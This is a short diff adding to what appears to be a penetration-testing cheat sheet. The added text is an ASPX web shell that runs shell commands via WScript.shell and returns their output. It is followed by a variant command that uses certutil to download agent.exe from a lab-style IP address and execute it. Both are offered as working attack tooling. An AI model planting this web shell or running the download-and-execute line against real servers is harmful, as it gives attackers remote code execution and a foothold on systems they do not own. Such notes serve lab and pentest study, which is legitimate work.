@@ -73,3 +73,15 @@ EOF
 $ chmod u+x /tmp/shell.sh
 $ /tmp/shell.sh
 ```
+
+**ASPX shell script**
+
+```aspx
+<%
+Set rs = CreateObject("WScript.shell")
+Set cmd = rs.Exec("cmd /c ping 10.10.14.19")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+```
+Replace the command with this you can download a file and execute `Set cmd = rs.Exec("certutil -urlcache -split -f http://10.10.14.8/agent.exe c:\\users\\public\\agent.exe && cmd /c c:\users\public\agent.exe")`
